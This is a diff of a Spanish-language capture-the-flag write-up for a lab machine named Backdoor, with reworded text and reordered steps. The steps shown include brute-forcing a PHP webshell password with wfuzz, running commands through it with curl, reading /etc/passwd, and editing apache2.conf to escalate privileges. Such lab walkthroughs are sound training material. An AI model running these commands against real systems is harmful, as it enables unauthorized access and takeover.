@@ -52,7 +52,7 @@
         },
         "datePublished": "2023-06-02",
         "description": "Writeup Backdoor 🔴",
-        "wordCount":  623 ,
+        "wordCount":  612 ,
         "mainEntityOfPage": "True",
         "dateModified": "2023-06-02",
         "image": {
@@ -225,7 +225,7 @@ stroke-linejoin="round" class="feather feather-home">
 </span></span><span style="display:flex;"><span>000000267:   200        4 L      5 W        34 Ch       &#34;php-backdoor.php&#34; 
 </span></span></code></pre></div><p>Desde el navegador visualizo <code>php-backdoor.php</code> para ver de que se trata.</p>
 <p><img src="/../machines/nyx/backdoor/securewebshell.webp" alt="securewebshell"></p>
-<p>Realizo fuerza bruta al campo password usando el parámetro <em>&amp;cmd=id</em>.</p>
+<p>Realizo fuerza bruta al campo password.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>❯ wfuzz -c --hh=34 -w /usr/share/wordlists/rockyou.txt -d &#39;password=FUZZ&amp;cmd=id&#39; -u &#39;http://192.168.1.58/Backdoor/php-backdoor.php&#39;
 </span></span><span style="display:flex;"><span>********************************************************
 </span></span><span style="display:flex;"><span>* Wfuzz 3.1.0 - The Web Fuzzer                         *
@@ -239,7 +239,7 @@ stroke-linejoin="round" class="feather feather-home">
 </span></span><span style="display:flex;"><span>=====================================================================
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>000004807:   200        5 L      8 W        88 Ch       &#34;newpassword&#34;
-</span></span></code></pre></div><p>Mando todos los datos usando el método POST y veo el id del usuario <strong>www-data</strong> eso significa que tengo ejecución de comandos.</p>
+</span></span></code></pre></div><p>Con curl veo el id del usuario <strong>www-data</strong> eso significa que tengo ejecución de comandos.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>❯ curl -X POST -d &#39;password=newpassword&amp;cmd=id&#39; http://192.168.1.58/Backdoor/php-backdoor.php
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>&lt;pre&gt;
@@ -266,16 +266,16 @@ stroke-linejoin="round" class="feather feather-home">
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>User www-data may run the following commands on backdoor:
 </span></span><span style="display:flex;"><span>    (root) NOPASSWD: /usr/sbin/reboot
-</span></span></code></pre></div><p>Enumero los usuarios del sistema.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>www-data@backdoor:/var/www/html/Backdoor$ cat /etc/passwd | grep /bin/bash
-</span></span><span style="display:flex;"><span>root:x:0:0:root:/root:/bin/bash
-</span></span><span style="display:flex;"><span>rootkit:x:1000:1000:rootkit,,,:/home/rootkit:/bin/bash
 </span></span></code></pre></div><p>Hago una búsqueda de archivos que tengan permisos de escritura y encuentro <code>apache2.conf</code>.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>www-data@backdoor:/var/www/html/Backdoor$ find / -writable 2&gt;/dev/null | grep -v -i -E &#39;proc|sys|dev|run&#39;
 </span></span><span style="display:flex;"><span>/etc/apache2/apache2.conf
 </span></span></code></pre></div><p>Verifico que tengo permisos de escritura.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>www-data@backdoor:/var/www/html/Backdoor$ ls -l /etc/apache2/apache2.conf 
 </span></span><span style="display:flex;"><span>-rw-r--rw- 1 root root 7270 Jun  2 14:25 /etc/apache2/apache2.conf
+</span></span></code></pre></div><p>Enumero los usuarios del sistema.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>www-data@backdoor:/var/www/html/Backdoor$ cat /etc/passwd | grep /bin/bash
+</span></span><span style="display:flex;"><span>root:x:0:0:root:/root:/bin/bash
+</span></span><span style="display:flex;"><span>rootkit:x:1000:1000:rootkit,,,:/home/rootkit:/bin/bash
 </span></span></code></pre></div><p>Edito el archivo <code>apache2.conf</code> y añado estas dos líneas al final del archivo.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>User rootkit
 </span></span><span style="display:flex;"><span>Group rootkit
